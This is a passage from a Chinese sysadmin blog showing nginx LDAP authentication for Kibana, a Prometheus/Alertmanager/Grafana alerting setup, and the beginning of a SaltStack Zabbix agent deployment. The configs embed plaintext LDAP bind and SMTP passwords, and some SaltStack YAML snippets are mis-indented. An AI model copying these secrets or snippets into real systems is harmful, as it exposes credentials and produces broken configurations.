30s;</span><br><span class="line">    open_file_cache_min_uses    2;</span><br><span class="line">    open_file_cache_errors      on;</span><br><span class="line"></span><br><span class="line">    client_max_body_size        50m;</span><br><span class="line"></span><br><span class="line">    #缓存可以减少ldap验证频率，不然每个页面都需要ldap验证一次</span><br><span class="line">    #你不在乎的话，不要缓存也是没有任何问题的 </span><br><span class="line">    proxy_cache_path cache/ keys_zone=auth_cache:10m;</span><br><span class="line"></span><br><span class="line">#kibanan</span><br><span class="line">upstream kibana_server &#123;</span><br><span class="line">    server 10.2.8.44:5601;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 5601;</span><br><span class="line">    server_name localhost;</span><br><span class="line">    access_log logs/kibanan_access.log main;</span><br><span class="line">    error_log logs/kibanan_error.log debug;</span><br><span class="line"></span><br><span class="line">    #后端程序，也就是kubernetes-dashboard</span><br><span class="line">    location / &#123;</span><br><span class="line">        auth_request /auth-proxy;</span><br><span class="line"></span><br><span class="line">        #nginx接收到nginx-ldap-auth-daemon.py返回的401和403都会重新跳转到登录页面</span><br><span class="line">        error_page 401 403 =200 /login;</span><br><span class="line"></span><br><span class="line">        proxy_pass http://kibana_server;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #登录页面，由backend-sample-app.py提供，跑在同一台机器的8082端口(默认不是8082端口)</span><br><span class="line">    location /login &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:9000/login;</span><br><span class="line">        proxy_set_header X-Target $request_uri;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location = /auth-proxy &#123;</span><br><span class="line">        internal;</span><br><span class="line">        proxy_pass http://127.0.0.1:8888;     #nginx-ldap-auth-daemon.py运行端口</span><br><span class="line">        #缓存设置</span><br><span class="line">        proxy_cache auth_cache;</span><br><span class="line">        proxy_cache_key &quot;$http_authorization$cookie_nginxauth&quot;;</span><br><span class="line">        proxy_cache_valid 200 403 10m;</span><br><span class="line"></span><br><span class="line">        proxy_pass_request_body off;</span><br><span class="line">        proxy_set_header Content-Length &quot;&quot;;</span><br><span class="line"></span><br><span class="line">        #最最重要的ldap配置，请务必按照贵公司的ldap配置如下四项，我在这一步卡了好久，就是ldap配置不对</span><br><span class="line">        #这些配置都会通过http头部传递给nginx-ldap-auth-daemon.py脚本</span><br><span class="line">        proxy_set_header X-Ldap-URL      &quot;ldap://192.168.88.88:389&quot;;</span><br><span class="line">        proxy_set_header X-Ldap-BaseDN   &quot;ou=People,dc=che,dc=org&quot;;</span><br><span class="line">        proxy_set_header X-Ldap-BindDN   &quot;cn=OPITUser,ou=OuterUser,dc=che,dc=org&quot;;</span><br><span class="line">        proxy_set_header X-Ldap-BindPass &quot;opit@minminmsn&quot;;</span><br><span class="line">        proxy_set_header X-Ldap-Template &quot;(uid=%(username)s)&quot;;</span><br><span class="line"></span><br><span class="line">        proxy_set_header X-CookieName &quot;nginxauth&quot;;</span><br><span class="line">        proxy_set_header Cookie nginxauth=$cookie_nginxauth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<h3 id="Python-Ldap认证"><a href="#Python-Ldap认证" class="headerlink" title="Python Ldap认证"></a><strong>Python Ldap认证</strong></h3></blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/nginxinc/nginx-ldap-auth/archive/0.0.4.tar.gz</span><br><span class="line">tar zxvf 0.0.4.tar.gz</span><br><span class="line">python nginx-ldap-auth-daemon.py &amp;</span><br></pre></td></tr></table></figure>

<blockquote>
<h3 id="后端登陆跳转页面"><a href="#后端登陆跳转页面" class="headerlink" title="后端登陆跳转页面"></a><strong>后端登陆跳转页面</strong></h3></blockquote>
<p>默认页面只能测试，这里需要大概改下才能使用 vim backend-sample-app.py python backend-sample-app.py &amp; backend-sample-app.py其中html&#x3D;``````修改后如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf8&quot;/&gt;</span><br><span class="line">&lt;title&gt;login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">*&#123;margin:0;padding:0;&#125;</span><br><span class="line">.login&#123;</span><br><span class="line">width:400px;</span><br><span class="line">height:220px;</span><br><span class="line">margin:0 auto;</span><br><span class="line">position:absolute;</span><br><span class="line">left:35%;</span><br><span class="line">top:25%;</span><br><span class="line">&#125;</span><br><span class="line">.login_title&#123;</span><br><span class="line">color: #000000;</span><br><span class="line">font: bold 14px/37px Arial,Helvetica,sans-serif;</span><br><span class="line">height: 37px;</span><br><span class="line">padding-left: 35px;</span><br><span class="line">text-align: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.login_cont &#123;</span><br><span class="line">    background: none repeat scroll 0 0 #FFFFFF;</span><br><span class="line">    border: 1px solid #B8B7B7;</span><br><span class="line">    height: 152px;</span><br><span class="line">    padding-top: 30px;</span><br><span class="line">&#125;</span><br><span class="line">.form_table &#123;</span><br><span class="line">    float: left;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">    table-layout: fixed;</span><br><span class="line">    width: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.form_table th &#123;</span><br><span class="line">    color: #333333;</span><br><span class="line">    font-weight: bold;</span><br><span class="line">    padding: 5px 8px 5px 0;</span><br><span class="line">    text-align: right;</span><br><span class="line">    white-space: nowrap;</span><br><span class="line">&#125;</span><br><span class="line">.form_table td &#123;</span><br><span class="line">    color: #717171;</span><br><span class="line">    line-height: 200%;</span><br><span class="line">    padding: 6px 0 5px 10px;</span><br><span class="line">    text-align: left;</span><br><span class="line">&#125;</span><br><span class="line">.login_cont input.submit &#123;</span><br><span class="line">    background-position: 0 -37px;</span><br><span class="line">    height: 29px;</span><br><span class="line">    margin: 10px 14px 0 0;</span><br><span class="line">    width: 38px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;login&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;login_cont&quot;&gt;</span><br><span class="line">            &lt;form action=&#x27;/login&#x27; method=&#x27;post&#x27;&gt;</span><br><span class="line">                &lt;table class=&quot;form_table&quot;&gt;</span><br><span class="line">                    &lt;col width=&quot;60px&quot; /&gt;</span><br><span class="line">                    &lt;col /&gt;</span><br><span class="line">                        &lt;p align=&quot;center&quot;&gt;  欢迎登陆kibana管理平台&lt;/p&gt;</span><br><span class="line">                        &lt;p align=&quot;center&quot;&gt;  请使用邮箱账户密码登陆&lt;/p&gt;</span><br><span class="line">                    &lt;tr&gt;</span><br><span class="line">                        &lt;th&gt;用户名:&lt;/th&gt;&lt;td&gt;&lt;input class=&quot;normal&quot; type=&quot;text&quot; name=&quot;username&quot; alt=&quot;请填写用户名&quot; /&gt;&lt;th&gt;@minminmsn.com&lt;/th&gt;&lt;/td&gt;</span><br><span class="line">                    &lt;/tr&gt;</span><br><span class="line">                    &lt;tr&gt;</span><br><span class="line">                        &lt;th&gt;密   码:&lt;/th&gt;&lt;td&gt;&lt;input class=&quot;normal&quot; type=&quot;password&quot; name=&quot;password&quot; alt=&quot;请填写密码&quot; /&gt;&lt;/td&gt;</span><br><span class="line">                    &lt;/tr&gt;</span><br><span class="line">                    &lt;tr&gt;</span><br><span class="line">                        &lt;th&gt;&lt;/th&gt;&lt;td&gt;&lt;input class=&quot;submit&quot; type=&quot;submit&quot; value=&quot;登录&quot; /&gt;&lt;input class=&quot;submit&quot; type=&quot;reset&quot; value=&quot;取消&quot; /&gt;&lt;/td&gt;</span><br><span class="line">                    &lt;/tr&gt;</span><br><span class="line">                &lt;/table&gt;</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; name=&quot;target&quot; value=&quot;TARGET&quot;&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<h3 id="登陆测试"><a href="#登陆测试" class="headerlink" title="登陆测试"></a><strong>登陆测试</strong></h3><p><a target="_blank" rel="noopener" href="http://192.168.88.188:5601/">http://192.168.88.188:5601/</a> <a target="_blank" rel="noopener" href="https://i.loli.net/2018/12/24/5c20c64965803.png"><img src="/images/5c20c64965803.png"></a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/21/2018/12/2018-12-21-promethous%E9%85%8D%E5%90%88alertmanager%E6%8A%A5%E8%AD%A6%E7%B3%BB%E7%BB%9F/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/21/2018/12/2018-12-21-promethous%E9%85%8D%E5%90%88alertmanager%E6%8A%A5%E8%AD%A6%E7%B3%BB%E7%BB%9F/index/" class="post-title-link" itemprop="url">Promethous配合Alertmanager报警系统</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-21 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-21T08:00:00+08:00">2018-12-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/op/" itemprop="url" rel="index"><span itemprop="name">op</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<h3 id="Promethous-Alertmanager-Grafana"><a href="#Promethous-Alertmanager-Grafana" class="headerlink" title="Promethous+Alertmanager+Grafana"></a><strong>Promethous+Alertmanager+Grafana</strong></h3><p>监控技术栈如下： Prometheus(最新版)：基于TSDB的微服务指标采集&amp;报警； Alertmanager：报警服务； Grafana（&gt;&#x3D;5.x）：监控报表展示。</p>
</blockquote>
<h3 id="一、软件部署"><a href="#一、软件部署" class="headerlink" title="一、软件部署"></a>一、<strong>软件部署</strong></h3><h5 id="1-1-Prometheus安装"><a href="#1-1-Prometheus安装" class="headerlink" title="1.1 Prometheus安装"></a>1.1 Prometheus安装</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># wget https://github.com/prometheus/prometheus/releases/download/v2.5.0/prometheus-2.5.0.linux-amd64.tar.gz</span><br><span class="line"># tar zxvf prometheus-2.5.0.linux-amd64.tar.gz -C /usr/local/</span><br><span class="line"># cd /usr/local/</span><br><span class="line"># ln -s prometheus-2.5.0.linux-amd64 prometheus</span><br><span class="line"># chown work:work prometheus* -R</span><br><span class="line"># cd prometheus</span><br><span class="line"># ls</span><br><span class="line"># console_libraries consoles LICENSE NOTICE prometheus prometheus.yml promtool</span><br></pre></td></tr></table></figure>

<h5 id="1-2-Alertmanager安装"><a href="#1-2-Alertmanager安装" class="headerlink" title="1.2 Alertmanager安装"></a>1.2 Alertmanager安装</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># wget https://github.com/prometheus/alertmanager/releases/download/v0.15.3/alertmanager-0.15.3.linux-amd64.tar.gz</span><br><span class="line"># tar zxvf alertmanager-0.15.3.linux-amd64.tar.gz </span><br><span class="line"># ln -s alertmanager-0.15.3.linux-amd64 alertmanager</span><br><span class="line"># chown work:work alertmanager* -R</span><br><span class="line"># cd alertmanager</span><br><span class="line"># ls</span><br><span class="line"># alertmanager alertmanager.yml amtool LICENSE NOTICE</span><br></pre></td></tr></table></figure>

<h5 id="1-3-Grafana安装"><a href="#1-3-Grafana安装" class="headerlink" title="1.3 Grafana安装"></a>1.3 Grafana安装</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># wget wget https://dl.grafana.com/oss/release/grafana-5.3.4-1.x86_64.rpm </span><br><span class="line"># rpm -Uvh grafana-5.3.4-1.x86_64.rpm </span><br><span class="line"># systemctl restart grafana.service</span><br></pre></td></tr></table></figure>

<h3 id="二、服务配置"><a href="#二、服务配置" class="headerlink" title="二、服务配置"></a>二、<strong>服务配置</strong></h3><h5 id="2-1-Prometheus配置"><a href="#2-1-Prometheus配置" class="headerlink" title="2.1 Prometheus配置"></a>2.1 Prometheus配置</h5><p>指定服务监听alertmanager端口及报警规则目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/prometheus/prometheus.yml</span><br><span class="line"></span><br><span class="line">#配置alertmanager信息</span><br><span class="line">alerting:</span><br><span class="line">  alertmanagers:</span><br><span class="line">  - static_configs:</span><br><span class="line">    - targets: [&#x27;localhost:9093&#x27;]</span><br><span class="line">#配置告警规则目录</span><br><span class="line">rule_files:</span><br><span class="line">  - /usr/local/prometheus/rules/*.rules</span><br></pre></td></tr></table></figure>

<h5 id="2-2-Rules策略配置"><a href="#2-2-Rules策略配置" class="headerlink" title="2.2 Rules策略配置"></a>2.2 Rules策略配置</h5><p>创建一个服务down的报警规则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/prometheus/rules/service_down.rules</span><br><span class="line"></span><br><span class="line">groups:</span><br><span class="line">- name: ServiceStatus #规则组名称   </span><br><span class="line">  rules:</span><br><span class="line">  - alert: ServiceStatusAlert  #单个规则的名称</span><br><span class="line">    expr: up == 0   #匹配规则, up==0</span><br><span class="line">    for: 10s        #持续时间</span><br><span class="line">    labels:         #标签</span><br><span class="line">      project: APP    #自定义lables</span><br><span class="line">    annotations:            #告警正文</span><br><span class="line">      summary: &quot;Instance &#123;&#123; $labels.instance &#125;&#125; down&quot;</span><br><span class="line">      description: &quot;&#123;&#123; $labels.instance &#125;&#125; of job &#123;&#123; $labels.job &#125;&#125; has been down for more than 1 minutes.&quot;</span><br></pre></td></tr></table></figure>

<h5 id="2-3-Alertmanager配置"><a href="#2-3-Alertmanager配置" class="headerlink" title="2.3 Alertmanager配置"></a>2.3 Alertmanager配置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/alertmanager/alertmanager.yml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#全局配置,比如配置发件人</span><br><span class="line">global:</span><br><span class="line">  resolve_timeout: 5m    #处理超时时间，默认为5min</span><br><span class="line">  smtp_smarthost: &#x27;smtp.163.com:25&#x27;  # 邮箱smtp服务器代理</span><br><span class="line">  smtp_from: &#x27;zabbix@minminmsn.com&#x27; # 发送邮箱名称</span><br><span class="line">  smtp_auth_username: &#x27;zabbix@minminmsn.com&#x27; # 邮箱名称</span><br><span class="line">  smtp_auth_password: &#x27;12345678xxOO&#x27;              # 邮箱密码或授权码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 定义模板信息,可以自定义html模板,发邮件的时候用自己定义的模板内容发</span><br><span class="line">templates:</span><br><span class="line">  - &#x27;template/*.tmpl&#x27;</span><br><span class="line"></span><br><span class="line"># 定义路由树信息,这个路由可以接收到所有的告警,还可以继续配置路由,比如project: APP(prometheus 告警规则中自定义的lable)发给谁</span><br><span class="line">route:</span><br><span class="line">  group_by: [&#x27;alertname&#x27;] # 报警分组依据</span><br><span class="line">  group_wait: 10s         # 最初即第一次等待多久时间发送一组警报的通知</span><br><span class="line">  group_interval: 60s     # 在发送新警报前的等待时间</span><br><span class="line">  repeat_interval: 1h     # 发送重复警报的周期 对于email配置中，此项不可以设置过低，否则将会由于邮件发送太多频繁，被smtp服务器拒绝</span><br><span class="line">  receiver: &#x27;email&#x27;       # 发送警报的接收者的名称，以下receivers name的名称</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 定义警报接收者信息</span><br><span class="line">receivers:</span><br><span class="line">  - name: &#x27;email&#x27;  # 路由中对应的receiver名称</span><br><span class="line">    email_configs: # 邮箱配置</span><br><span class="line">    - to: &#x27;admin@minminmsn.com&#x27;   # 接收警报的email配置</span><br><span class="line">      #html: &#x27;&#123;&#123; template &quot;test.html&quot; . &#125;&#125;&#x27;  # 设定邮箱的内容模板</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="三、服务启动"><a href="#三、服务启动" class="headerlink" title="三、服务启动"></a><strong>三、服务启动</strong></h3><h5 id="3-1-Prometheus启动"><a href="#3-1-Prometheus启动" class="headerlink" title="3.1 Prometheus启动"></a>3.1 Prometheus启动</h5><blockquote>
<p>&#x2F;usr&#x2F;local&#x2F;prometheus&#x2F;prometheus –config.file&#x3D;prometheus.yml –web.enable-lifecycle –web.external-url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:9090/">http://127.0.0.1:9090</a> –storage.tsdb.path&#x3D;&#x2F;data1&#x2F;prometheus&#x2F;data &amp;</p>
</blockquote>
<h5 id="3-2-Alertmanager启动"><a href="#3-2-Alertmanager启动" class="headerlink" title="3.2 Alertmanager启动"></a>3.2 Alertmanager启动</h5><blockquote>
<p>&#x2F;usr&#x2F;local&#x2F;alermanager&#x2F;alertmanager &amp;</p>
</blockquote>
<h3 id="四、报警验证"><a href="#四、报警验证" class="headerlink" title="四、报警验证"></a><strong>四、报警验证</strong></h3><h5 id="4-1-Prometheus"><a href="#4-1-Prometheus" class="headerlink" title="4.1 Prometheus"></a>4.1 Prometheus</h5><blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/7535971-8b6137a6cc83e54c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</blockquote>
<h5 id="4-2-Rules"><a href="#4-2-Rules" class="headerlink" title="4.2 Rules"></a>4.2 Rules</h5><blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/7535971-a4b32df84f36babc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</blockquote>
<h5 id="4-3-Alerts"><a href="#4-3-Alerts" class="headerlink" title="4.3 Alerts"></a>4.3 Alerts</h5><blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/7535971-e26d0dd59ec95652.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</blockquote>
<h5 id="4-4-Mails"><a href="#4-4-Mails" class="headerlink" title="4.4 Mails"></a>4.4 Mails</h5><blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/7535971-c67d7ec377009d1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</blockquote>
<h3 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a><strong>五、参考</strong></h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://yunlzheng.gitbook.io/prometheus-book/parti-prometheus-ji-chu/alert">https://yunlzheng.gitbook.io/prometheus-book/parti-prometheus-ji-chu/alert</a> <a target="_blank" rel="noopener" href="https://prometheus.io/docs/prometheus/latest/getting/_started/">https://prometheus.io/docs/prometheus/latest/getting\_started/</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/18/2018/12/2018-12-18-saltstack%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85zabbix_agent%E5%AE%A2%E6%88%B7%E7%AB%AF/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/18/2018/12/2018-12-18-saltstack%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85zabbix_agent%E5%AE%A2%E6%88%B7%E7%AB%AF/index/" class="post-title-link" itemprop="url">Saltstack源码安装zabbix_agent客户端</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-18 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-18T08:00:00+08:00">2018-12-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p><strong>安装和环境介绍略，直接上正题</strong></p>
</blockquote>
<h3 id="一，首先是树状图"><a href="#一，首先是树状图" class="headerlink" title="一，首先是树状图"></a><strong>一，首先是树状图</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@saltmaster salt]# pwd</span><br><span class="line">/srv/salt</span><br><span class="line">[root@saltmaster salt]# tree</span><br><span class="line">.</span><br><span class="line">├── init</span><br><span class="line">│   └── init.sls</span><br><span class="line">├── top.sls</span><br><span class="line">└── zabbix</span><br><span class="line">    ├── conf.sls</span><br><span class="line">    ├── files</span><br><span class="line">    │   ├── zabbix_agentd</span><br><span class="line">    │   ├── zabbix_agentd.conf</span><br><span class="line">    │   └── zabbix.tar.gz</span><br><span class="line">    ├── init.sls</span><br><span class="line">    └── install.sls</span><br><span class="line">3 directories, 8 files</span><br></pre></td></tr></table></figure>

<h3 id="二，先系统初始化"><a href="#二，先系统初始化" class="headerlink" title="二，先系统初始化"></a><strong>二，先系统初始化</strong></h3><p>这里目前只是告诉客户端安装vim-enhanced、lrzsz这2个软件，可以根据实际情况自行安装依赖软件，pkg安装模块目前支持apt与yum。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@saltmaster salt]# cat init/init.sls </span><br><span class="line">pkgs:</span><br><span class="line">  pkg.installed:</span><br><span class="line">    - names:            </span><br><span class="line">      - vim-enhanced</span><br><span class="line">        - lrzsz</span><br></pre></td></tr></table></figure>

<h3 id="三，入口文件top-sls"><a href="#三，入口文件top-sls" class="headerlink" title="三，入口文件top.sls"></a><strong>三，入口文件top.sls</strong></h3><p>SLS（代表SaLt State文件）是Salt State系统的核心。SLS描述了系统的目标状态，由格式简单的数据构成。这经常被称作配置管理，其中top.sls文件是配置管理的入口文件，一切都是从这里开始，在master 主机上，默认存放在&#x2F;srv&#x2F;salt&#x2F;目录. top.sls。</p>
<p>这里有2个配置项，一个是系统初始化，一个是zabbix客户端安装。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@saltmaster salt]# cat top.sls </span><br><span class="line">base:</span><br><span class="line">  &#x27;*&#x27;</span><br><span class="line">    - init.init</span><br><span class="line">  &#x27;*&#x27;:</span><br><span class="line">    - zabbix.init</span><br></pre></td></tr></table></figure>

<h3 id="四，Zabbinx目录的init-sls"><a href="#四，Zabbinx目录的init-sls" class="headerlink" title="四，Zabbinx目录的init.sls"></a><strong>四，Zabbinx目录的init.sls</strong></h3><p>顺序执行zabbix目录下的install.sls与zabbix目录下的conf.sls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@saltmaster salt]# cat zabbix/init.sls </span><br><span class="line"></span><br><span class="line">include:</span><br><span class="line">  - zabbix.install</span><br><span class="line">    - zabbix.conf</span><br></pre></td></tr></table></figure>

